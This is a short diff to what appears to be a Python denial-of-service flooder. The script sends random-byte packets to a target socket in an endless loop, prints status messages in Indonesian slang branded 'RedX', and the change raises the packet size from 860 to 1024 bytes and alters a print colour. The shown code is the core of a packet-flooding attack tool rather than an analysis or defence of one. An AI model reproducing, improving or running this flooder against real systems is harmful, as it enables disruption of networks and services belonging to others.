@@ -39,7 +39,7 @@ def run():
                 except:
                         print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 def run2():
-        data = random._urandom(860)
+        data = random._urandom(1024)
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
@@ -48,7 +48,7 @@ def run2():
                         s.send(data)
                         for x in range(times):
                              s.send(data)
-                        print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
+                        print("\033[95m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
                 except:
                         s.close()
                         print("\033[93m[*TOK*TOK*] PERMISI PAKET DATENG")
